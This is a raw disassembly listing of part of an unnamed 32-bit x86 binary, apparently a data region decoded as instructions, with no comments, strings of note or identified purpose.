  421a30:	inc    edx
  421a31:	add    BYTE PTR [eax+edx*4],dl
  421a34:	inc    edx
  421a35:	add    BYTE PTR [eax],bl
  421a37:	nop
  421a38:	inc    edx
  421a39:	add    BYTE PTR [eax+edx*4],bl
  421a3c:	inc    edx
  421a3d:	add    BYTE PTR [eax],al
  421a3f:	mov    al,ds:0xa0040042
  421a44:	inc    edx
  421a45:	add    BYTE PTR [eax],cl
  421a47:	mov    al,ds:0xa00c0042
  421a4c:	inc    edx
  421a4d:	add    BYTE PTR [eax],dl
  421a4f:	mov    al,ds:0xa0140042
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],bl
  421a57:	mov    al,ds:0xa01c0042
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],al
  421a5f:	mov    al,0x42
  421a61:	add    BYTE PTR [eax+esi*4],al
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	mov    al,0x42
  421a69:	add    BYTE PTR [eax+esi*4],cl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	mov    al,0x42
  421a71:	add    BYTE PTR [eax+esi*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	mov    al,0x42
  421a79:	add    BYTE PTR [eax+esi*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax+0x66],bh
  421a80:	ins    BYTE PTR es:[edi],dx
  421a81:	jp     0x421ada
  421a83:	jbe    0x421acc
  421a85:	ja     0x421aca
  421a87:	js     0x421ad1
  421a89:	jno    0x421aee
  421a8b:	inc    edx
  421a8c:	inc    bx
  421a8e:	push   ebp
  421a8f:	jno    0x421b07
  421a91:	ja     0x421afa
  421a93:	dec    edi
  421a94:	dec    esp
  421a95:	dec    ebp
  421a96:	inc    edx
  421a97:	jno    0x421b0a
  421a99:	jae    0x421aee
  421a9b:	push   eax
  421a9c:	arpl   WORD PTR [ebx+0x46],dx
  421a9f:	push   ds
  421aa0:	inc    edx
  421aa1:	add    BYTE PTR [esi+0x1e],cl
  421aa4:	inc    edx
  421aa5:	add    dh,ah
  421aa7:	sbb    al,0x42
  421aa9:	add    bh,ch
  421aab:	or     esi,DWORD PTR [edx+0x304e790e]
  421ab1:	dec    esi
  421ab2:	xchg   DWORD PTR [edi+0x3d],ecx
  421ab5:	dec    esi
  421ab6:	scas   eax,DWORD PTR es:[edi]
  421ab7:	dec    edi
  421ab8:	ds dec esi
  421aba:	js     0x421b0a
  421abc:	cmp    ecx,DWORD PTR [esi-0x64]
  421abf:	dec    edi
  421ac0:	inc    esp
  421ac1:	dec    esi
  421ac2:	jae    0x421b12
  421ac4:	inc    ecx
  421ac5:	dec    esi
  421ac6:	xor    BYTE PTR [esi+0x40],cl
  421ac9:	dec    esi
  421aca:	pop    esp
  421acb:	pop    ebp
  421acc:	pop    edi
  421acd:	push   edx
  421ace:	cmp    DWORD PTR [esi+0x79],ecx
  421ad1:	dec    esi
  421ad2:	xor    BYTE PTR [esi-0x79],cl
  421ad5:	dec    edi
  421ad6:	cmp    eax,0x3e4faf4e
  421adb:	dec    esi
  421adc:	js     0x421b2c
  421ade:	cmp    ecx,DWORD PTR [esi-0x64]
  421ae1:	dec    edi
  421ae2:	inc    esp
  421ae3:	dec    esi
  421ae4:	mov    DWORD PTR [edi+0x41],ecx
  421ae7:	dec    esi
  421ae8:	xor    BYTE PTR [esi+0x40],cl
  421aeb:	dec    esi
  421aec:	pop    esp
  421aed:	ins    DWORD PTR es:[edi],dx
  421aee:	pop    edi
  421aef:	bound  edi,QWORD PTR [ecx]
  421af1:	dec    esi
  421af2:	jns    0x421b42
  421af4:	xor    BYTE PTR [esi-0x80],cl
  421af7:	dec    edi
  421af8:	cmp    eax,0x394e734e
  421afd:	dec    esi
  421afe:	mov    ds:0x304e3a4f,al
  421b03:	dec    esi
  421b04:	inc    esi
  421b05:	dec    esi
  421b06:	pop    esp
  421b07:	jge    0x421b68
  421b09:	jb     0x421b7a
  421b0b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b0f:	xchg   ebx,eax
  421b10:	jns    0x421aa2
  421b12:	aas    
  421b13:	dec    esi
  421b14:	test   BYTE PTR [edi+0x30],cl
  421b17:	dec    esi
  421b18:	test   BYTE PTR [edi+0x3c],cl
  421b1b:	dec    esi
  421b1c:	mov    ds:0x734e394f,al
  421b21:	dec    esi
  421b22:	inc    ebp
  421b23:	dec    esi
  421b24:	xor    BYTE PTR [esi+0x44],cl
  421b27:	dec    esi
  421b28:	pop    esp
  421b29:	lea    ebx,[edi-0x7e]
  421b2c:	outs   dx,DWORD PTR ds:[esi]
  421b2d:	xchg   edx,eax
  421b2e:	outs   dx,BYTE PTR ds:[esi]
  421b2f:	xchg   ebx,eax
  421b30:	jle    0x421ad5
  421b32:	jns    0x421ad4
  421b34:	aas    
  421b35:	dec    esi
  421b36:	test   BYTE PTR [edi+0x30],cl
  421b39:	dec    esi
  421b3a:	test   BYTE PTR [edi+0x3c],cl
  421b3d:	dec    esi
  421b3e:	mov    ds:0x894e394f,al
  421b43:	dec    edi
  421b44:	inc    ebp
  421b45:	dec    esi
  421b46:	xor    BYTE PTR [esi+0x44],cl
  421b49:	dec    esi
  421b4a:	pop    esp
  421b4b:	popf   
  421b4c:	pop    edi
  421b4d:	xchg   edx,eax
  421b4e:	outs   dx,DWORD PTR ds:[esi]
  421b4f:	mov    ds:0xb37ea36e,al
  421b54:	jns    0x421b06
  421b56:	aas    
  421b57:	dec    esi
  421b58:	mov    cs,WORD PTR [edi+0x30]
  421b5b:	dec    esi
  421b5c:	lods   al,BYTE PTR ds:[esi]
  421b5d:	dec    edi
  421b5e:	cmp    eax,0x394e734e
  421b63:	dec    esi
  421b64:	mov    eax,ds:0x304e3a4f
  421b69:	dec    esi
  421b6a:	inc    esp
  421b6b:	dec    esi
  421b6c:	pop    esp
  421b6d:	lods   eax,DWORD PTR ds:[esi]
  421b6e:	pop    edi
  421b6f:	mov    ds:0xb36eb26f,al
  421b74:	jle    0x421b39
  421b76:	jns    0x421b38
  421b78:	aas    
  421b79:	dec    esi
  421b7a:	mov    cs,WORD PTR [edi+0x30]
  421b7d:	dec    esi
  421b7e:	lods   al,BYTE PTR ds:[esi]
  421b7f:	dec    edi
  421b80:	cmp    eax,0x394e7e4e
  421b85:	dec    esi
  421b86:	lahf   
  421b87:	dec    edi
  421b88:	cmp    ecx,DWORD PTR [esi+0x30]
  421b8b:	dec    esi
  421b8c:	inc    ebp
  421b8d:	dec    esi
  421b8e:	pop    esp
  421b8f:	mov    ebp,0xc26fb25f
  421b94:	outs   dx,BYTE PTR ds:[esi]
  421b95:	ret    
  421b96:	jle    0x421b6b
  421b98:	jns    0x421b6a
  421b9a:	aas    
  421b9b:	dec    esi
  421b9c:	mov    cs,WORD PTR [edi+0x30]
  421b9f:	dec    esi
  421ba0:	lods   al,BYTE PTR ds:[esi]
  421ba1:	dec    edi
  421ba2:	cmp    eax,0x394f804e
  421ba7:	dec    esi
  421ba8:	lods   al,BYTE PTR ds:[esi]
  421ba9:	dec    edi
  421baa:	cmp    cl,BYTE PTR [esi+0x30]
  421bad:	dec    esi
  421bae:	inc    esi
  421baf:	dec    esi
  421bb0:	pop    esp
  421bb1:	int    0x5f
  421bb3:	ret    0xd26f
  421bb6:	outs   dx,BYTE PTR ds:[esi]
  421bb7:	sar    DWORD PTR [esi-0x1d],cl
  421bba:	jns    0x421b9c
  421bbc:	aas    
  421bbd:	dec    esi
  421bbe:	mov    cs,WORD PTR [edi+0x30]
  421bc1:	dec    esi
  421bc2:	lods   al,BYTE PTR ds:[esi]
  421bc3:	dec    edi
  421bc4:	cmp    eax,0x394f834e
  421bc9:	dec    esi
  421bca:	mov    ds:0x304e3a4f,al
  421bcf:	dec    esi
  421bd0:	inc    esp
  421bd1:	dec    esi
  421bd2:	pop    esp
  421bd3:	fstp   QWORD PTR [edi-0x2e]
  421bd6:	outs   dx,DWORD PTR ds:[esi]
  421bd7:	loop   0x421c47
  421bd9:	jecxz  0x421c59
  421bdb:	repz jns 0x421bce
  421bde:	aas    
  421bdf:	dec    esi
  421be0:	lea    ecx,[edi+0x30]
  421be3:	dec    esi
  421be4:	lahf   
  421be5:	dec    edi
  421be6:	cmp    eax,0x3c4fa04e
  421beb:	dec    esi
  421bec:	xor    BYTE PTR [esi+0x3f],cl
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	in     eax,dx
  421bf2:	pop    edi
  421bf3:	loop   0x421c64
  421bf5:	repnz outs dx,BYTE PTR ds:[esi]
  421bf7:	repz jle 0x421bfd
  421bfa:	jns    0x421bfc
  421bfc:	jle    0x421c11
  421bfe:	jns    0x421c10
  421c00:	cmp    al,0x4e
  421c02:	jg     0x421c52
  421c04:	xor    BYTE PTR [esi-0x65],cl
  421c07:	dec    edi
  421c08:	xor    cl,BYTE PTR [esi-0x80]
  421c0b:	dec    edi
  421c0c:	cmp    al,0x4e
  421c0e:	lods   eax,DWORD PTR ds:[esi]
  421c0f:	dec    edi
  421c10:	cmp    ecx,DWORD PTR [esi+0x30]
  421c13:	dec    esi
  421c14:	inc    ebp
  421c15:	dec    esi
  421c16:	pop    esp
  421c17:	or     eax,0x126f025f
  421c1c:	outs   dx,BYTE PTR ds:[esi]
  421c1d:	adc    edi,DWORD PTR [esi+0x23]
  421c20:	jns    0x421c42
  421c22:	aas    
  421c23:	dec    esi
  421c24:	add    BYTE PTR [eax],al
  421c26:	scas   al,BYTE PTR es:[edi]
  421c27:	sbb    al,BYTE PTR [edx+0x0]
  421c2a:	mov    ds:0xaa00421c,al
  421c2f:	sbb    al,0x42
  421c31:	add    BYTE PTR [edx+0x1e],dl
  421c34:	inc    edx
  421c35:	add    BYTE PTR [esi+0x4200421d],bh
  421c3b:	push   ds
  421c3c:	inc    edx
  421c3d:	add    BYTE PTR [edx-0x71ffbde4],cl
  421c43:	sbb    al,0x42
  421c45:	add    BYTE PTR [esi],bh
  421c47:	push   ds
  421c48:	inc    edx
  421c49:	add    dl,dh
  421c4b:	sbb    al,0x42
  421c4d:	add    BYTE PTR ds:0x36f89ca9,cl
  421c53:	mov    edx,0x1ca6f89c
  421c58:	inc    edx
  421c59:	add    BYTE PTR [esi+0x1d],dh
  421c5c:	inc    edx
  421c5d:	add    BYTE PTR [edx-0x69ffbde3],cl
  421c63:	sbb    eax,0x1da60042
  421c68:	inc    edx
  421c69:	add    dh,bl
  421c6b:	sbb    al,0x42
  421c6d:	add    BYTE PTR [edx-0x1ffbde6],ch
  421c73:	sbb    al,0x42
  421c75:	add    dh,ch
  421c77:	sbb    al,0x42
  421c79:	add    BYTE PTR [esi+0x1e],dl
  421c7c:	inc    edx
  421c7d:	add    BYTE PTR [esi+0x19f89c85],dh
  421c83:	or     edx,DWORD PTR [edi]
  421c85:	xor    DWORD PTR [edx+0x1400421c],0x881161c
  421c8f:	or     eax,0x705
  421c94:	inc    eax
  421c95:	add    BYTE PTR [edx],bh
  421c97:	inc    edx
  421c98:	ds ds enter 0x4279,0x0
  421c9e:	ins    DWORD PTR es:[edi],dx
  421c9f:	push   ebp
  421ca0:	inc    esp
  421ca1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ca7:	in     eax,dx
  421ca8:	inc    BYTE PTR [edi]
  421caa:	aas    
  421cab:	cli    
  421cac:	mov    ds:0x421c9a05,eax
  421cb1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cb7:	xchg   esi,eax
  421cb8:	pushf  
  421cb9:	clc    
  421cba:	mov    ah,0x95
  421cbc:	pushf  
  421cbd:	clc    
  421cbe:	mov    ebx,0xbaf89c95
  421cc3:	xchg   ebp,eax
  421cc4:	pushf  
  421cc5:	clc    
  421cc6:	mov    ecx,0xb8f89c95
  421ccb:	xchg   ebp,eax
  421ccc:	pushf  
  421ccd:	clc    
  421cce:	mov    edi,0xbef89c95
  421cd3:	xchg   ebp,eax
  421cd4:	pushf  
  421cd5:	clc    
  421cd6:	mov    ebp,0xa6f89c95
  421cdb:	xchg   ebp,eax
  421cdc:	pushf  
  421cdd:	clc    
  421cde:	jmp    0x421a:0xa26003f9
  421ce5:	add    BYTE PTR [eax+eax*2+0x42],ch
  421ce9:	add    BYTE PTR [ebx+0x77],dl
  421cec:	jbe    0x421d3e
  421cee:	mov    dh,0x85
  421cf0:	pushf  
  421cf1:	clc    
  421cf2:	sbb    ecx,ebp
  421cf4:	push   eax
  421cf5:	pop    es
  421cf6:	sbb    BYTE PTR [ebx],cl
  421cf8:	add    BYTE PTR [eax],al
  421cfa:	sahf   
  421cfb:	sbb    al,BYTE PTR [edx+0x0]
  421cfe:	sbb    ecx,DWORD PTR [ebx]
  421d00:	add    al,0xe
	...
  421d32:	ins    BYTE PTR es:[edi],dx
  421d33:	inc    eax
  421d34:	inc    edx
  421d35:	add    BYTE PTR [esi+0x66f89c85],dh
  421d3b:	add    BYTE PTR [edx+0x0],ch
  421d3e:	add    BYTE PTR [si+0x0],ah
  421d42:	push   0x64006700
  421d47:	add    BYTE PTR [esi+0x0],ah
  421d4a:	push   0x0
  421d4c:	push   0x66006400
  421d51:	add    BYTE PTR [edi+0x0],ah
  421d54:	push   0x0
  421d56:	push   0x66006700
  421d5b:	add    BYTE PTR [eax+0x0],ch
  421d5e:	add    BYTE PTR [bp+0x0],ah
  421d62:	push   0x66006700
	...
  421d6f:	add    BYTE PTR [eax],al
  421d71:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421d77:	dec    edi
  421d78:	lahf   
  421d79:	dec    edi
  421d7a:	mov    ds:0x9f4fa64f,al
  421d7f:	dec    edi
  421d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d81:	dec    edi
  421d82:	ins    DWORD PTR es:[edi],dx
  421d83:	dec    esi
  421d84:	bound  ecx,QWORD PTR [esi+0x30]
  421d87:	dec    esi
  421d88:	add    BYTE PTR [eax],al
  421d8a:	cdq    
  421d8b:	dec    edi
  421d8c:	pushf  
  421d8d:	dec    edi
  421d8e:	fwait
  421d8f:	dec    edi
  421d90:	ins    DWORD PTR es:[edi],dx
  421d91:	dec    esi
  421d92:	bound  ecx,QWORD PTR [esi+0x30]
  421d95:	dec    esi
  421d96:	scas   eax,DWORD PTR es:[edi]
  421d97:	dec    edi
  421d98:	lods   eax,DWORD PTR ds:[esi]
  421d99:	dec    edi
  421d9a:	lahf   
  421d9b:	dec    edi
  421d9c:	mov    ds:0x624e6d4f,al
  421da1:	dec    esi
  421da2:	xor    BYTE PTR [esi+0x0],cl
  421da5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421dab:	dec    edi
  421dac:	test   eax,0xa04f934f
  421db1:	dec    edi
  421db2:	fwait
  421db3:	dec    edi
  421db4:	xor    BYTE PTR [esi+0x0],cl
  421db7:	add    BYTE PTR [eax],al
  421db9:	add    BYTE PTR [eax],al
  421dbb:	add    BYTE PTR [eax],al
  421dbd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421dc4:	mov    WORD PTR [ebp-0x32734274],gs
  421dca:	mov    ebp,ds
  421dcc:	mov    ebp,gs
  421dce:	mov    ebp,?
  421dd0:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421dd6:	mov    WORD PTR ds:0x6d8c5d8c,?
  421ddc:	mov    WORD PTR [edx-0x74],?
  421ddf:	jae    0x421d6d
  421de1:	jo     0x421d6f
  421de3:	jno    0x421d71
  421de5:	jbe    0x421d73
  421de7:	ja     0x421d75
  421de9:	je     0x421d77
  421deb:	jne    0x421d79
  421ded:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421df4:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421dfa:	lods   al,BYTE PTR ds:[esi]
  421dfb:	jge    0x421db9
  421dfd:	jge    0x421d9d
  421dff:	(bad)  
  421e00:	jns    0x421e75
  421e02:	mov    ecx,0x7d738cb1
  421e07:	ins    DWORD PTR es:[edi],dx
  421e08:	enter  0x9fc6,0x26
  421e0c:	jb     0x421e11
  421e0e:	test   eax,0xb956bb17
  421e13:	hlt    
  421e14:	test   al,0x37
  421e16:	test   al,0x7e
  421e18:	fnstenv [ecx-0x6a]
  421e1b:	mov    cl,0x6a
  421e1d:	push   0xffffffce
  421e1f:	or     BYTE PTR [edx],bl
  421e21:	xlat   BYTE PTR ds:[ebx]
  421e22:	out    dx,eax
  421e23:	add    eax,0x9321d7aa
  421e28:	scas   al,BYTE PTR es:[edi]
  421e29:	adc    DWORD PTR [esi],esp
  421e2b:	jge    0x421e50
  421e2d:	fidiv  WORD PTR [edi]
  421e2f:	leave  
  421e30:	hlt    
  421e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e32:	cmp    ax,0x1fc8
  421e36:	mov    dh,cl
  421e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e39:	(bad)  
  421e3a:	and    DWORD PTR [eax],ebx
  421e3c:	and    DWORD PTR [ecx-0x18],esi
  421e3f:	(bad)  [ebx+0x7]
  421e42:	cmc    
  421e43:	enter  0x301a,0x14
  421e47:	inc    eax
  421e48:	inc    edx
  421e49:	add    BYTE PTR [ecx+0x66],dh
  421e4c:	jp     0x421ebc
  421e4e:	xchg   edx,eax
  421e4f:	sbb    al,0x42
  421e51:	add    dh,dh
  421e53:	sbb    al,0x42
  421e55:	add    BYTE PTR [eax],cl
  421e57:	in     eax,dx
  421e58:	adc    al,BYTE PTR [edi]
  421e5a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e61:	ins    BYTE PTR es:[edi],dx
  421e62:	push   0x49657557
  421e67:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e6d:	push   edi
  421e6e:	jp     0x421eea
  421e70:	dec    ebp
  421e71:	push   esi
  421e72:	arpl   WORD PTR gs:[ecx+0x45],si
  421e76:	dec    edx
  421e77:	dec    esi
  421e78:	data16 ja 0x421ec9
  421e7b:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421e96:	inc    ebp
  421e97:	push   edx
  421e98:	jb     0x421f0e
  421e9a:	inc    esi
  421e9b:	je     0x421ede
  421e9d:	inc    esi
  421e9e:	jae    0x421f16
  421ea0:	dec    ebx
  421ea1:	gs dec ecx
  421ea3:	dec    ebp
  421ea4:	dec    ebp
  421ea5:	pop    edx
  421ea6:	jp     0x421f02
  421ea8:	jbe    0x421ef0
  421eaa:	pop    ecx
  421eab:	jo     0x421f25
  421ead:	inc    edi
  421eae:	gs ins BYTE PTR es:[edi],dx
  421eb0:	dec    esp
  421eb1:	js     0x421f1b
  421eb3:	inc    edx
  421eb4:	js     0x421efc
  421eb6:	dec    eax
  421eb7:	inc    ebp
  421eb8:	inc    esp
  421eb9:	inc    esp
  421eba:	push   ecx
  421ebb:	dec    edx
  421ebc:	ins    BYTE PTR es:[edi],dx
  421ebd:	dec    ebx
  421ebe:	jbe    0x421f2e
  421ec0:	pop    eax
  421ec1:	jbe    0x421f0e
  421ec3:	inc    ecx
  421ec4:	fs gs jno 0x421f35
  421ec8:	push   ebx
  421ec9:	inc    ecx
  421eca:	add    BYTE PTR [eax],al
  421ecc:	inc    ebx
  421ecd:	outs   dx,BYTE PTR ds:[esi]
  421ece:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421ed2:	push   edx
  421ed3:	push   ecx
  421ed4:	push   0x74000064
  421ed9:	jne    0x421f50
  421edb:	ins    DWORD PTR es:[edi],dx
  421edc:	push   ecx
  421edd:	push   eax
  421ede:	jo     0x421f5a
  421ee0:	addr16 jo 0x421f39
  421ee3:	pop    eax
  421ee4:	add    BYTE PTR [eax],al
  421ee6:	push   ecx
  421ee7:	pop    ecx
  421ee8:	inc    ebx
  421ee9:	inc    edx
  421eea:	outs   dx,BYTE PTR ds:[esi]
  421eeb:	popa   
  421eec:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421ef0:	jne    0x421f60
  421ef2:	dec    ebx
  421ef3:	je     0x421f58
  421ef5:	bound  esp,QWORD PTR [edi+0x0]
  421ef8:	jns    0x421f3f
  421efa:	bound  ebp,QWORD PTR [ecx+0x46]
  421efd:	dec    ecx
  421efe:	ja     0x421f45
  421f00:	dec    eax
  421f01:	inc    ebp
  421f02:	inc    edx
  421f03:	push   ebx
  421f04:	add    BYTE PTR [eax],al
  421f06:	outs   dx,DWORD PTR ds:[esi]
  421f07:	inc    edi
  421f08:	dec    esi
  421f09:	outs   dx,DWORD PTR ds:[esi]
  421f0a:	pop    ecx
  421f0b:	inc    edi
  421f0c:	jb     0x421f55
  421f0e:	jns    0x421f86
  421f10:	inc    ecx
  421f11:	pop    eax
  421f12:	dec    esp
  421f13:	add    BYTE PTR [eax+0x48],bh
  421f16:	bound  edx,QWORD PTR [ebx+0x43]
  421f19:	pop    eax
  421f1a:	outs   dx,DWORD PTR ds:[esi]
  421f1b:	push   0x4355
  421f20:	dec    esp
  421f21:	ins    BYTE PTR es:[edi],dx
  421f22:	inc    edx
  421f23:	push   0x76666a73
  421f28:	inc    edx
  421f29:	jo     0x421f2b
  421f2b:	add    BYTE PTR [eax],al
  421f2d:	add    BYTE PTR [edi+0x6d],ah
  421f30:	je     0x421f79
  421f32:	ins    BYTE PTR es:[edi],dx
  421f33:	jae    0x421f9f
  421f35:	inc    esi
  421f36:	ins    DWORD PTR es:[edi],dx
  421f37:	je     0x421f8f
  421f39:	push   0x56584178
  421f3e:	push   ebx
  421f3f:	addr16 dec edx
  421f41:	jo     0x421fb5
  421f43:	js     0x421fb4
  421f45:	pop    eax
  421f46:	dec    ebx
  421f47:	push   esp
  421f48:	dec    esp
  421f49:	jns    0x421f96
  421f4b:	js     0x421fc5
  421f4d:	outs   dx,BYTE PTR ds:[esi]
  421f4e:	pop    ecx
  421f4f:	jae    0x421fbf
  421f51:	push   0x43644448
  421f56:	arpl   WORD PTR [edx+0x55],sp
  421f59:	push   0x42504e67
  421f5e:	push   ebp
  421f5f:	je     0x421fd6
  421f61:	addr16 dec edi
  421f63:	dec    esp
  421f64:	inc    edx
  421f65:	ins    DWORD PTR es:[edi],dx
  421f66:	inc    esi
  421f67:	inc    esi
  421f68:	inc    esi
  421f69:	arpl   WORD PTR [edx+0x47],bx
  421f6c:	push   ebp
  421f6d:	inc    ebx
  421f6e:	popa   
  421f6f:	push   edx
  421f70:	dec    esp
  421f71:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421f78:	push   ecx
  421f79:	push   ebx
  421f7a:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421f81:	dec    edx
  421f82:	jns    0x421fed
  421f84:	push   edx
  421f85:	inc    ebx
  421f86:	jo     0x421ffd
  421f88:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421f8c:	fs push ebx
  421f8e:	inc    ebx
  421f8f:	push   ebp
  421f90:	push   eax
  421f91:	ja     0x421fce
  421f93:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421f97:	mov    ebp,0xa53ddffb
  421f9c:	js     0x421f57
  421f9e:	les    ecx,FWORD PTR [edx-0x28f6c8d7]
  421fa4:	add    DWORD PTR [eax],eax
  421fa6:	bound  eax,QWORD PTR [eax]
  421fa8:	add    BYTE PTR [eax],al
  421faa:	nop
  421fab:	in     al,0x5f
  421fad:	jb     0x421f92
  421faf:	jg     0x421f7d
  421fb1:	jle    0x421ff7
  421fb3:	adc    edx,DWORD PTR [esi]
  421fb5:	loope  0x421fb1
  421fb7:	rcl    ecx,cl
  421fb9:	dec    ebp
  421fba:	push   es
  421fbb:	pop    ecx
  421fbc:	jmp    0x87be243e
  421fc1:	push   edi
  421fc2:	adc    DWORD PTR ds:0x7242d8db,edi
  421fc8:	fisttp DWORD PTR [eax-0x54]
  421fcb:	dec    BYTE PTR [ecx]
  421fcd:	and    al,0x63
  421fcf:	ficom  DWORD PTR [edx]
  421fd1:	sar    dl,1
  421fd3:	mov    ecx,0x139dc43c
  421fd8:	jg     0x42200c
  421fda:	popf   
  421fdb:	out    dx,eax
  421fdc:	jge    0x421f90
  421fde:	dec    edi
  421fdf:	(bad)  
  421fe0:	in     al,0x28
  421fe2:	cs out 0x11,eax
  421fe5:	or     eax,0x9f8f62d4
  421fea:	push   cs
  421feb:	call   0xbd124614
  421ff0:	dec    edi
  421ff1:	shl    edx,1
  421ff3:	mov    eax,0xae199c73
  421ff8:	int3   
  421ff9:	and    dh,BYTE PTR [ebp+0x11]
  421ffc:	lds    ecx,FWORD PTR ds:0x4a74fea6
  422002:	aas    
  422003:	adc    BYTE PTR [edx-0x35],dh
  422006:	mov    esp,0x8bc6ceee
  42200b:	adc    eax,DWORD PTR [eax]
  42200d:	add    BYTE PTR [eax],al
  42200f:	add    BYTE PTR [eax],al
  422011:	add    BYTE PTR [eax],ch
  422013:	mov    dl,0xa5
  422015:	push   edx
  422016:	mov    edi,0x7cfaff57
  42201b:	xlat   BYTE PTR fs:[ebx]
  42201d:	push   esi
  42201e:	dec    edi
  42201f:	and    eax,0xd76b4fe8
  422024:	add    DWORD PTR [eax],eax
  422026:	bound  eax,QWORD PTR [eax]
  422028:	add    BYTE PTR [eax],al
  42202a:	cmp    ah,BYTE PTR [ebx]
  42202c:	sti    
  42202d:	push   ss
  42202e:	jnp    0x422034
  422030:	rcr    BYTE PTR [esi],0xfd
  422033:	dec    eax
  422034:	popf   
  422035:	(bad)  
  422036:	loope  0x422016
  422038:	pop    esp
  422039:	push   ecx
  42203a:	stc    
  42203b:	xor    ah,BYTE PTR [esp+ebx*2-0x11582986]
  422042:	add    edx,ebx
  422044:	aad    0x94
  422046:	fstp   TBYTE PTR [ecx]
  422048:	inc    ebp
  422049:	and    ecx,DWORD PTR [esi-0x1c]
  42204c:	mov    bl,0xbc
  42204e:	inc    ebx
  42204f:	push   cs
  422050:	or     DWORD PTR [eax+0x70],0x25
  422054:	dec    ebp
  422055:	jb     0x42203d
  422057:	sti    
  422058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422059:	and    BYTE PTR ds:0xa06887b2,al
  42205f:	sar    BYTE PTR [esi+0x4],cl
  422062:	int3   
  422063:	cld    
  422064:	(bad)  
  422065:	arpl   WORD PTR [edx-0xd],sp
  422068:	cld    
  422069:	aaa    
  42206a:	cmp    al,0x9f
  42206c:	jae    0x422030
  42206e:	pop    esi
  42206f:	and    DWORD PTR [eax+edx*4],edi
  422072:	mov    dh,0x16
  422074:	cmp    ah,BYTE PTR [ecx+esi*1]
  422077:	mov    ds:0x9a3667d7,eax
  42207c:	and    DWORD PTR [ebx+0x4bc7231c],edx
  422082:	test   eax,0x198e97bb
  422087:	mov    al,ds:0x6e3bcc3a
  42208c:	add    BYTE PTR [eax],al
  42208e:	add    BYTE PTR [eax],al
  422090:	add    BYTE PTR [eax],al
  422092:	mov    bl,0x55
  422094:	jg     0x422017
  422096:	jmp    FWORD PTR [ebx-0x69418801]
  42209c:	push   0x36dd9757
  4220a1:	sbb    ebp,ecx
  4220a3:	xlat   BYTE PTR ds:[ebx]
  4220a4:	add    DWORD PTR [eax],eax
  4220a6:	bound  eax,QWORD PTR [eax]
  4220a8:	add    BYTE PTR [eax],al
  4220aa:	fldcw  WORD PTR [edx-0x63973c9c]
  4220b0:	(bad)  [eax]
  4220b2:	push   edi
  4220b3:	jp     0x422053
  4220b5:	dec    esi
  4220b6:	pop    ebx
  4220b7:	ins    BYTE PTR es:[edi],dx
  4220b8:	push   edx
  4220b9:	cmp    BYTE PTR [ebx-0x1f],dl
  4220bc:	inc    ebx
  4220bd:	int    0x7
  4220bf:	push   edi
  4220c0:	push   ds
  4220c1:	jns    0x422138
  4220c3:	adc    eax,0xed21229b
  4220c8:	or     DWORD PTR [eax],ebp
  4220ca:	push   ss
  4220cb:	and    DWORD PTR [esi],0xeefe0ef
  4220d1:	mov    eax,ds:0x79d6d27f
  4220d6:	pop    ebx
  4220d7:	mov    ah,0x8c
  4220d9:	lock gs addr16 mov bh,0xf0
  4220de:	mov    bh,0x69
  4220e0:	jle    0x4220fd
  4220e2:	rcl    BYTE PTR [eax-0x261c1546],cl
  4220e8:	dec    edx
  4220e9:	jge    0x42212e
  4220eb:	adc    ebp,DWORD PTR [eax]
  4220ed:	scas   al,BYTE PTR es:[edi]
  4220ee:	mov    cl,0xe3
  4220f0:	dec    ebp
  4220f1:	sub    al,0x88
  4220f3:	stos   DWORD PTR es:[edi],eax
  4220f4:	jecxz  0x4220bc
  4220f6:	xchg   DWORD PTR [esi+0x705a81f9],edi
  4220fc:	adc    esi,DWORD PTR [ebx]
  4220fe:	cdq    
  4220ff:	data16 outs dx,BYTE PTR ds:[esi]
  422101:	shr    BYTE PTR [edx],cl
  422103:	sub    esp,edi
  422105:	inc    DWORD PTR [eax+0x1874fc05]
  42210b:	and    DWORD PTR [eax],eax
  42210d:	add    BYTE PTR [eax],al
  42210f:	add    BYTE PTR [eax],al
  422111:	add    BYTE PTR [eax],bh
  422113:	(bad)  
  422114:	cmp    ah,BYTE PTR [esi+edi*8]
  422117:	in     al,dx
  422118:	fimul  WORD PTR ds:[edi-0x4953942b]
  42211f:	xchg   esi,eax
  422120:	dec    ebx
  422121:	fs das 
  422123:	fadd   DWORD PTR [ecx]
  422125:	add    BYTE PTR [edx+0x0],ah
  422128:	add    BYTE PTR [eax],al
  42212a:	and    al,0x25
  42212c:	popf   
  42212d:	adc    cl,BYTE PTR [edx+0x50]
  422130:	mov    ds:0x2cdde975,eax
  422135:	repz sbb BYTE PTR [edx+0x78],al
  422139:	push   esi
  42213a:	pop    esi
  42213b:	call   0xfa651f4e
  422140:	shl    BYTE PTR [edi-0x302a33ce],0x14
  422147:	cmp    DWORD PTR [ecx],ecx
  422149:	icebp  
  42214a:	sub    ah,dl
  42214c:	push   ss
